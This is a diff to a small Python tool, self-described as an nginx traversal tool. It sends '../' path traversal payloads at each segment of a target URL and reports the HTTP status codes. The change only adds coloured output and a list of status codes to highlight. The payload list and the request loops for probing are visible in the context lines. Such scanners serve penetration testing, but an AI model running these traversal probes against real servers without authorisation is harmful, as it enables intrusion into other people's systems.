@@ -2,10 +2,14 @@ try:
     from urllib.parse import urlparse
 except ImportError:
      from urlparse import urlparse
+from colorama import Fore, init
+from termcolor import colored
 import sys
 import argparse as ag
 import requests as rq
 import pyfiglet
+
+init()
 
 argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
 argparser.add_argument("url", type=str, help="URL of the target")
@@ -14,6 +18,7 @@ argparser.add_argument("-a", help="append segment in the end", action="store_tru
 
 args = argparser.parse_args()
 
+valid = ['403', '400', '200']
 payloads = ["../", "../../", "../../../../../../../../../../../"]
 
 def make_a_request (url):
@@ -40,12 +45,14 @@ def main():
             _x = ""
         for payload in payloads:
             _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
-            sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))
+            statcode = make_a_request(_url)
+            sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
 
     for i in range(0, len(segments)-1):
         for payload in payloads:
             _url = parser.scheme+"://"+parser.netloc+"/" + '/'.join(segments[0:i+1]) + payload + '/'.join(segments[i+1:len(segments)])
-            sys.stdout.write("{} \033[92m[{}]\033[00m\n".format(_url, make_a_request(_url)))
+            statcode = make_a_request(_url)
+            sys.stdout.write("{} [{}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
 
 
 
